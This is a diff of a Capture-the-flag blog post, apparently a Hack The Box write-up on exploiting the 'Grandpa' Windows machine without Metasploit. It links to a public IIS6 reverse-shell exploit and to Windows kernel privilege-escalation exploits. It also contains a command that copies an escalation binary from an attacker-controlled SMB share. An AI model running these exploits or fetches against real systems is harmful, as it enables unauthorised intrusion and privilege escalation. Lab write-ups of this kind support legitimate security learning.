@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Grandpa without metasploit
-date: 2020-03-31
+date: 2020-04-1
 author: th3-3inst3in
 comments: true
 categories: htb
@@ -54,8 +54,6 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell  
 
 
-
-![LFI]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/lfi.png)
 
 
 
@@ -124,7 +122,7 @@ https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012
 
 - the smb share can easily be accessed using copy command from the prompt 
 
-_Prompt> copy \\<IP>\test\pr.exe ._
+>Prompt> copy \\<IP>\test\pr.exe .
 
 
 ![smbserver]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Grandpa/smbserver.png)
